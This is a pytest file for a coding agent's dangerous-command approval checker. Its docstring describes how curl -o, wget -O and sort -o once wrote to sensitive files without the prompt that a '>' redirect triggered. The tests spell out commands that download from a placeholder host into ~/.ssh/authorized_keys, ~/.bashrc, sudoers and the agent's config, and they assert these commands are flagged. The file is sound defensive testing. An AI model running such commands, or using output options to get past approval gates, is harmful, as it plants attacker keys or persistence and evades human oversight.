"""An output-file option is gated exactly like the `>` redirect it replaces.

`curl URL > ~/.ssh/authorized_keys` prompted, but `curl -o ~/.ssh/authorized_keys URL`,
`wget -qO ~/.bashrc URL` and `sort -o ~/.bashrc x` ran without one: the write rules listed
redirection, tee, cp/mv/install and in-place editors, not a utility's own output option
(arXiv:2611.29546 "ParseGap" finds this class in every studied coding-agent checker).
"""

import pytest

from tools.approval import detect_dangerous_command


def _is_dangerous(cmd: str) -> bool:
    return bool(detect_dangerous_command(cmd)[0])


@pytest.mark.parametrize("target", ["~/.ssh/authorized_keys", "~/.bashrc", "~/.hermes/config.yaml", "/etc/sudoers.d/x"])
@pytest.mark.parametrize("write", [
    "curl -fsSL https://x.example/f -o {t}",
    "curl -sSLo {t} https://x.example/f",
    "curl https://x.example/f --output={t}",
    "wget -qO {t} https://x.example/f",
    "wget --output-document {t} https://x.example/f",
    "sort -u keys.txt -o {t}",
    "cd /src && curl -o {t} https://x.example/f",
])
def test_output_option_to_sensitive_target_is_gated_like_redirect(write, target):
    assert _is_dangerous(f"curl -fsSL https://x.example/f > {target}")  # the redirect it mirrors
    assert _is_dangerous(write.format(t=target))


@pytest.mark.parametrize("cmd", [
    "curl -o out.txt https://x.example/data",
    "curl -sSLo /tmp/install.sh https://x.example/i",
    "curl https://x.example/.bashrc -o bashrc.example",
    "wget -O - https://x.example/a | jq .",
    "sort -o sorted.txt ~/.ssh/known_hosts",
    "sort ~/.bashrc -o bashrc.sorted",
    "grep -o curl ~/.bashrc",
    "curl --output-dir ~/downloads -O https://x.example/f",
])
def test_output_option_elsewhere_or_reading_a_sensitive_file_runs(cmd):
    assert not _is_dangerous(cmd)
